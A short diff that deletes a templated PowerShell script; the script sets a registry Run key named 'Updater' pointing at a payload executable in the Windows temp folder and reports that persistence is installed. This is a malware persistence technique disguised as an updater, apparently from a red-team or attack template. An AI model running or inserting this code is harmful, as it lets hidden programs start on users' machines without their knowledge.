@@ -1,4 +1,0 @@
-$path = "{{ payload_path | default('C:\\Windows\\Temp\\payload.exe') }}"
-$name = "Updater"
-New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $name -Value $path -PropertyType String -Force
-Write-Host "Persistence installed via HKCU Run key."
